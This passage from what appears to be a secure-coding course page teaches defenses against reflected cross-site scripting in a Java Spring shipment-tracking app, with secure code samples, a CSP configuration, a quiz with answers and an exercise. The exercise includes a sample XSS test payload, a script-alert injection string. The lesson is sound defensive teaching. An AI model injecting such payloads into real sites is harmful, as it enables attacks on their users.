public ResponseEntity&lt;String&gt; trackShipment(
    @RequestParam String trackingId) {

    // SAFE: HTML-encode user input before rendering
    String safeTrackingId = HtmlUtils.htmlEscape(trackingId);
    String response = "Tracking information for: " + safeTrackingId;

    return ResponseEntity.ok()
        .contentType(MediaType.TEXT_HTML)
        .body("&lt;html&gt;&lt;body&gt;" + response + "&lt;/body&gt;&lt;/html&gt;");
}</pre>
                        </div>

                        <div class="code-block secure">
                            <span class="code-label secure">✓ SECURE CODE - Option 2: Template Engine (Thymeleaf)</span>
                            <pre>// ShipmentController.java - BEST PRACTICE
@GetMapping("/api/shipments/track")
public String trackShipment(
    @RequestParam String trackingId,
    Model model) {

    // SAFEST: Use template engine with auto-escaping
    model.addAttribute("trackingId", trackingId);
    return "tracking";  // Renders tracking.html template
}

// tracking.html - Thymeleaf automatically escapes
&lt;html xmlns:th="http://www.thymeleaf.org"&gt;
&lt;body&gt;
    &lt;h1&gt;Shipment Tracking&lt;/h1&gt;
    &lt;!-- th:text automatically HTML-escapes the value --&gt;
    &lt;p&gt;Tracking information for: &lt;span th:text="${trackingId}"&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/body&gt;
&lt;/html&gt;</pre>
                        </div>

                        <div class="code-block secure">
                            <span class="code-label secure">✓ SECURE CODE - Option 3: Content Security Policy</span>
                            <pre>// SecurityConfig.java - Add CSP Headers
@Configuration
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http.headers()
            .contentSecurityPolicy(
                "default-src 'self'; " +
                "script-src 'self'; " +
                "style-src 'self' 'unsafe-inline'; " +
                "img-src 'self' data:; " +
                "font-src 'self'; " +
                "connect-src 'self'; " +
                "frame-ancestors 'none';"
            );
        return http.build();
    }
}</pre>
                        </div>

                        <div class="info-box">
                            <h4>Defense in Depth Strategies</h4>
                            <ol>
                                <li><strong>Output Encoding:</strong> Encode based on context (HTML, JavaScript, URL, CSS)</li>
                                <li><strong>Template Engines:</strong> Use engines with automatic escaping (Thymeleaf, JSP with EL)</li>
                                <li><strong>Content Security Policy (CSP):</strong> Restrict what scripts can execute</li>
                                <li><strong>HTTPOnly Cookies:</strong> Prevent JavaScript from accessing session cookies</li>
                                <li><strong>Input Validation:</strong> Whitelist allowed characters (defense in depth)</li>
                                <li><strong>X-XSS-Protection Header:</strong> Enable browser XSS filters</li>
                            </ol>
                        </div>

                        <div class="info-box">
                            <h4>Context-Specific Encoding</h4>
                            <table style="width: 100%; border-collapse: collapse; margin-top: 10px;">
                                <tr style="border-bottom: 1px solid rgba(255,255,255,0.1);">
                                    <td style="padding: 8px;"><strong>Context</strong></td>
                                    <td style="padding: 8px;"><strong>Encoding Method</strong></td>
                                    <td style="padding: 8px;"><strong>Example</strong></td>
                                </tr>
                                <tr style="border-bottom: 1px solid rgba(255,255,255,0.1);">
                                    <td style="padding: 8px;">HTML Body</td>
                                    <td style="padding: 8px;">HtmlUtils.htmlEscape()</td>
                                    <td style="padding: 8px;">&lt;div&gt;${encoded}&lt;/div&gt;</td>
                                </tr>
                                <tr style="border-bottom: 1px solid rgba(255,255,255,0.1);">
                                    <td style="padding: 8px;">HTML Attribute</td>
                                    <td style="padding: 8px;">HtmlUtils.htmlEscape()</td>
                                    <td style="padding: 8px;">&lt;input value="${encoded}"&gt;</td>
                                </tr>
                                <tr style="border-bottom: 1px solid rgba(255,255,255,0.1);">
                                    <td style="padding: 8px;">JavaScript</td>
                                    <td style="padding: 8px;">JavaScriptUtils.javaScriptEscape()</td>
                                    <td style="padding: 8px;">var x = "${encoded}";</td>
                                </tr>
                                <tr>
                                    <td style="padding: 8px;">URL Parameter</td>
                                    <td style="padding: 8px;">URLEncoder.encode()</td>
                                    <td style="padding: 8px;">?param=${encoded}</td>
                                </tr>
                            </table>
                        </div>
                    </div>

                    <div class="quiz-section">
                        <h3>🎯 Test Your Knowledge</h3>

                        <div class="quiz-question">
                            <h4>Question 1: Which type of XSS is demonstrated in the Cargo Cats vulnerability?</h4>
                            <div class="quiz-options">
                                <div class="quiz-option" onclick="checkAnswer(5, 1, 1)">
                                    A) Reflected XSS
                                </div>
                                <div class="quiz-option" onclick="checkAnswer(5, 2, 1)">
                                    B) Stored XSS
                                </div>
                                <div class="quiz-option" onclick="checkAnswer(5, 3, 1)">
                                    C) DOM-based XSS
                                </div>
                                <div class="quiz-option" onclick="checkAnswer(5, 4, 1)">
                                    D) Blind XSS
                                </div>
                            </div>
                            <div class="quiz-feedback" id="feedback-5-1">
                                <strong>Correct!</strong> This is Reflected XSS because the malicious input comes from the HTTP request and is immediately reflected in the response.
                            </div>
                            <div class="quiz-feedback" id="feedback-5-2">
                                <strong>Not quite.</strong> Reflected XSS occurs when user input from the request is immediately reflected in the response without proper encoding.
                            </div>
                        </div>

                        <div class="quiz-question">
                            <h4>Question 2: Which defense provides the STRONGEST protection against XSS?</h4>
                            <div class="quiz-options">
                                <div class="quiz-option" onclick="checkAnswer(6, 1, 3)">
                                    A) Input validation using blacklists
                                </div>
                                <div class="quiz-option" onclick="checkAnswer(6, 2, 3)">
                                    B) Using HTTPS instead of HTTP
                                </div>
                                <div class="quiz-option" onclick="checkAnswer(6, 3, 3)">
                                    C) Context-aware output encoding
                                </div>
                                <div class="quiz-option" onclick="checkAnswer(6, 4, 3)">
                                    D) Removing all user input
                                </div>
                            </div>
                            <div class="quiz-feedback" id="feedback-6-1">
                                <strong>Perfect!</strong> Context-aware output encoding is the most effective defense because it ensures user input is treated as data, not executable code.
                            </div>
                            <div class="quiz-feedback" id="feedback-6-2">
                                <strong>Incorrect.</strong> Context-aware output encoding is the most effective defense. Encode based on where the data is rendered (HTML, JavaScript, URL, etc.).
                            </div>
                        </div>

                        <div class="quiz-question">
                            <h4>Question 3: What does HTTPOnly flag on cookies prevent?</h4>
                            <div class="quiz-options">
                                <div class="quiz-option" onclick="checkAnswer(7, 1, 2)">
                                    A) Cookies from being sent over HTTP
                                </div>
                                <div class="quiz-option" onclick="checkAnswer(7, 2, 2)">
                                    B) JavaScript from accessing the cookie
                                </div>
                                <div class="quiz-option" onclick="checkAnswer(7, 3, 2)">
                                    C) Cookies from being encrypted
                                </div>
                                <div class="quiz-option" onclick="checkAnswer(7, 4, 2)">
                                    D) Cookies from expiring
                                </div>
                            </div>
                            <div class="quiz-feedback" id="feedback-7-1">
                                <strong>Excellent!</strong> HTTPOnly flag prevents JavaScript (including XSS attacks) from accessing the cookie via document.cookie, protecting session tokens.
                            </div>
                            <div class="quiz-feedback" id="feedback-7-2">
                                <strong>Not quite.</strong> HTTPOnly prevents JavaScript access to cookies, protecting them from being stolen via XSS attacks.
                            </div>
                        </div>

                        <button class="btn btn-primary" onclick="completeLesson(3)">Mark Lesson as Complete</button>
                    </div>

                    <div class="exercise-box">
                        <h4>💪 Hands-On Exercise</h4>
                        <p><strong>Task:</strong> Secure all user-controlled data that's rendered in web pages.</p>
                        <ol>
                            <li>Identify all places where user input is rendered (search for request parameters, form data)</li>
                            <li>For HTML context: Use <code>HtmlUtils.htmlEscape()</code> or Thymeleaf's <code>th:text</code></li>
                            <li>For JavaScript context: Use <code>JavaScriptUtils.javaScriptEscape()</code></li>
                            <li>Implement Content Security Policy (CSP) headers</li>
                            <li>Set HTTPOnly and Secure flags on session cookies</li>
                            <li>Test with XSS payloads: <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></li>
                        </ol>
                    </div>
                </div>
            </div>
        </div>

